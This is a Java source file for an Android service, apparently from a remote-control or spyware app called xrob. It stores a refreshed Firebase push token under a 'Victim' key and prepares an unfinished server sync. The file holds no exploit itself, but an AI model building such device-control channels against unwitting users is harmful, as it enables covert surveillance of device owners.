package com.theah64.xrob.services.firebase;

import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.FirebaseInstanceIdService;
import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.models.Victim;
import com.theah64.xrob.utils.PrefUtils;
import com.theah64.xrob.utils.APIRequestGateway;

public class InstanceIdService extends FirebaseInstanceIdService {

    private static final String X = InstanceIdService.class.getSimpleName();

    @Override
    public void onTokenRefresh() {

        final String refreshedToken = FirebaseInstanceId.getInstance().getToken();
        Log.i(X, "Firebase token refreshed : " + refreshedToken);

        final PrefUtils prefUtils = PrefUtils.getInstance(this);

        prefUtils.getEditor()
                .putString(Victim.KEY_FCM_ID, refreshedToken)
                .putBoolean(PrefUtils.IS_FCM_SYNCED, false)
                .commit();

        new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
            @Override
            public void onReadyToRequest(String apiKey) {
                //TODO: Create a server route to update the FCM id.
            }
        });
    }
}
